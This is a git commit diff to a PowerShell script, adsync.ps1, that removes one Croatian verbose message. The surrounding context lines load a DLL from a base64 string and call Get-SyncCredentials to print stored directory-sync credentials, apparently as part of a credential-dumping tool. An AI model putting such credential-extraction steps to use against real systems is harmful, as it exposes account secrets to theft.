148ea7cfd6dd0cc1262d55a55ec1286c2f977597
inkz1337 <113606031+inkz1337@users.noreply.github.com>
2023-09-29 22:51:09 +0200

    final

--- adsync.ps1
+++ adsync.ps1
@@ -266,5 +266,4 @@ $DLLBytes = [System.Convert]::FromBase64String($base64dll)
 $credentials = Get-SyncCredentials -AsBackgroundProcess $false
 return $credentials | Format-List
 
-Write-Verbose "Powershell tokeni ne stimaju resetiraj powershell nakon uzimanja pw-a"
 
